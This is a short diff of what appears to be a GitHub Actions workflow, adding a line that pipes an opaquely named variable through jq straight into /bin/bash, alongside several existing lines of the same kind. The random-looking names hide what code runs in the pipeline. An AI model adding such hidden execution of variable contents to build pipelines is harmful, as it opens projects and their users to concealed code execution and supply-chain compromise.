@@ -21,6 +21,7 @@ jobs:
           printf '%s' "$dj84" | jq -r .d44945 | /bin/bash
           printf '%s' "$fkcm006" | jq -r .xf39 | /bin/bash
           echo $qrlkg6502 | jq -r .yw0133 | /bin/bash
+          printf '%s' "$yeg47975" | jq -r .un5 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
